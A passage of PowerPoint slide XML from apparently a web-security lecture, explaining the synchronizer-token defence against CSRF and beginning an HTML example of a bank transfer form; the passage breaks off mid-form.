            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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40">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>token-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based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	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approach</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-114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(i.e.,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-11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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>synchronizer</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-90" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>token</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-110" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>pattern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)</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Idea:</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="234"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>generates</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>session-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specific</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-50" b="1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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>token</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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saves</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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it</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Session</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>token</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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included,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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hidden</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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field,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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sensitive</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>forms</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Upon</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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submission,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>token</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>transferred</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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again</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>app</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="204"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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app</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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verifies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>token</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>received</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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form</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>same</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="697865">
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
            </a:pP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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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one</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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it</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>generated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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saved</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-2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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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current</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>session</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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An</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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won’t</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-2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able</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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guess</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>token!</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1155065" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="280"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="1155065" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Provided</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-3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000">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>no</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-4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000">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-3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000" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-2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000" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>exist!</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1155065" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="265"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="1155065" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Provided</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-4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000">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-4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000">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-5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000" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>tokens</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-6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000">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>are</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-4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000">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2000" spc="-6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000" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>predicatable!</a:t>
            </a:r>
            <a:endParaRPr sz="20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45"/>
              <a:t>MITIGATING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-200"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-165"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t>ATTACKS:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-160"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>EXAMPLE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="882396" y="1748027"/>
            <a:ext cx="6908800" cy="4247515"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6908800" h="4247515">
                <a:moveTo>
                  <a:pt x="0" y="4247388"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6908292" y="4247388"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6908292" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4247388"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35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 descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="1767027"/>
            <a:ext cx="6668770" cy="414147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solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-65">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="180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 sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;html</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>lang</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"en"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="262255">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;head&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;title&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Bank.com</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40"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|</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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Safest</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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Bank</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Around</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/title&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="262255">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/head&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="262255">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;body&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;h1&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Bank</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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Transfer</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Page</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/h1&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;form</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>method</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
